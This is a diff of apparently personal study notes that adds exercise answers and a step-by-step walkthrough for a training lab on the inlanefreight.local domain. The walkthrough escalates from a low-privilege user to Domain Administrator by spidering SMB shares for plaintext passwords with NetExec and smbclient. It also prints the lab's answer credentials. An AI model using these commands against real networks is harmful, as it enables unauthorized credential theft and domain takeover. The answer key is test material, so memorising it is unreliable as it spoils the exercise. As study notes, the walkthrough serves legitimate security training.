@@ -232,7 +232,145 @@ SMB  10.129.234.121  445  DC01  [*] Spidering .
 
 ### Exercise Answers
 
-*Add exercise answers here as you complete them*
+**Q1 — Credential mendres has access to (another domain user):**
+`jbader : ILovePower333###`
+Located in `\\DC01\IT\Tools\split_tunnel.txt`.
+
+**Q2 — Domain Administrator password (as jbader):**
+`Administrator : Str0ng_Adm1nistrat0r_P@ssword_2025!`
+Located in `\\DC01\HR\Confidential\Onboarding_Docs_132.txt` — Josh Bader's onboarding doc literally documents the Administrator password granted to him for a 90-day DC migration project.
+
+---
+
+## 🎯 Walkthrough — Credential Chain on `inlanefreight.local`
+
+A worked example of pivoting from a low-priv user → domain user → Domain Administrator using only SMB share spidering.
+
+### Lab Notes & Heuristics
+
+This lab uses **decoy generators** (`IT\Admin\*.ps1`) that plant fake credentials throughout shares to defeat naive `grep passw` workflows. Real findings have these characteristics:
+
+| Characteristic | Decoy / Bait | Real Credential |
+|---|---|---|
+| **File size** | Uniform 113 B (filler) or 167–182 B (bait) | Outlier size (~200–2500 B) |
+| **Format** | `username=corpUser1\npassword=...` inline | Trailing `NOTE:` or `# Auth backup:` block |
+| **Examples (FAKE)** | `corpUser1:Summer2023!`, `hr_backup:HRrocks2025!`, `policy_mgr:SecureDocs99`, `doceditor:Draft456!`, `ad_mgr:Brand2025!` | (See answers above) |
+| **Generators** | `IT\Admin\Company.ps1`, `HR.ps1`, `Marketing.ps1`, etc. — read these to ID all bait | n/a |
+
+> 💡 **Always ignore `IT\Tools\nishang-master\` and `PowerSploit-master\`** — those are dropped tooling and produce thousands of `passw` matches.
+
+### Step 1 — Verify access and enumerate shares as the starting user
+
+```bash
+nxc smb 10.129.234.173 -u mendres -p 'Inlanefreight2025!' --shares
+```
+
+`mendres` has READ on: Company, HR, IT, NETLOGON, SYSVOL.
+
+### Step 2 — Spider readable shares for `passw`
+
+```bash
+for s in HR IT Company; do
+  echo "=========== $s ==========="
+  nxc smb 10.129.234.173 -u mendres -p 'Inlanefreight2025!' \
+      --spider "$s" --content --pattern "passw"
+done
+```
+
+Filter the noise: ignore `IT\Tools\nishang-master\*`, `PowerSploit-master\*`, and uniform-size decoys. The real hit is the size outlier:
+
+```
+//10.129.234.173/IT/Tools/split_tunnel.txt  size:224  pattern:'passw'
+```
+
+### Step 3 — Download and inspect the candidate file
+
+```bash
+smbclient //10.129.234.173/IT -U 'inlanefreight.local\mendres%Inlanefreight2025!' \
+  -c 'cd Tools; get split_tunnel.txt'
+cat 'Tools\split_tunnel.txt'
+```
+
+```
+Old settings for legacy VPN deployment:
+- Use split tunneling where possible
+- DNS resolution priority = local > remote
+
+# Auth backup password: INLANEFREIGHT\jbader:ILovePower333###
+
+- Ports used: 443, 8443, 1194
+```
+
+✅ **Pivot credential found: `jbader:ILovePower333###`**
+
+### Step 4 — Validate and re-enumerate shares as the new user
+
+```bash
+nxc smb 10.129.234.173 -u jbader -p 'ILovePower333###'           # confirms valid
+nxc smb 10.129.234.173 -u jbader -p 'ILovePower333###' --shares
+```
+
+`jbader` has **READ,WRITE** on Company, Finance, **HR**, IT, **Marketing**, **Sales** — note the newly accessible shares; that's where the next secret lives.
+
+### Step 5 — Spider all newly accessible shares
+
+```bash
+for s in HR IT Finance Marketing Sales Company; do
+  echo "=========== $s ==========="
+  nxc smb 10.129.234.173 -u jbader -p 'ILovePower333###' \
+      --spider "$s" --content --pattern "passw"
+done
+```
+
+Two high-value hits stand out (not in `Tools\` and not uniform-size decoys):
+
+- `HR/Confidential/Onboarding_Docs_132.txt`  ← previously **denied to mendres**
+- `IT/Admin/*.ps1`  ← these are the **decoy generator scripts** themselves (worth reading to understand the bait)
+
+### Step 6 — Bulk-download admin scripts + the HR confidential doc
+
+```bash
+mkdir -p ~/manspider/loot/q2 && cd ~/manspider/loot/q2
+
+smbclient //10.129.234.173/IT -U 'inlanefreight.local\jbader%ILovePower333###' \
+  -c 'prompt OFF; recurse ON; cd Admin; mget *'
+
+smbclient //10.129.234.173/HR -U 'inlanefreight.local\jbader%ILovePower333###' \
+  -c 'prompt OFF; cd Confidential; get Onboarding_Docs_132.txt'
+
+cat Onboarding_Docs_132.txt
+```
+
+The onboarding doc reveals the answer:
+
+```
+Notes:
+Jordan will be responsible for ... Temporarily granted access to the
+domain administrator account for initial 90 days ...
+
+Account credentials
+**Username:** `Administrator`
+**Password:** `Str0ng_Adm1nistrat0r_P@ssword_2025!`
+```
+
+✅ **Domain Admin credential found: `Administrator:Str0ng_Adm1nistrat0r_P@ssword_2025!`**
+
+### Step 7 — Verify Domain Admin
+
+```bash
+nxc smb 10.129.234.173 -u Administrator -p 'Str0ng_Adm1nistrat0r_P@ssword_2025!'
+# Expect (Pwn3d!) marker — full domain compromise
+```
+
+### 📝 Lessons Learned
+
+1. **NetExec `--spider --content --pattern` beats Snaffler/PowerHuntShares on this lab** — PowerHuntShares only matches filenames; Snaffler drowns in nishang/PowerSploit noise.
+2. **Look for size outliers**, not just keyword hits. A `passw` match in a 113-byte filler file is decoy; a `passw` match in a 224-byte file in an otherwise uniform share is gold.
+3. **Real creds live in trailing `NOTE:` / `# Auth backup:` blocks**, not inline `username=/password=` pairs (those are bait).
+4. **Re-enumerate shares after every credential pivot** — newly accessible shares (Finance, Marketing, Sales, HR\Confidential) are where the next secret lives.
+5. **Read the decoy generators** (`IT\Admin\*.ps1`) once you have access — they enumerate every fake credential planted in the lab, saving you from chasing each one.
+6. **Files with `.docx`/`.pdf` extensions may actually be plaintext** — always `cat` first, don't reflexively `unzip`.
+7. **`smbclient` saves files with literal `\` in filenames on Linux** — quote them: `cat 'Tools\split_tunnel.txt'`.
 
 ---
 
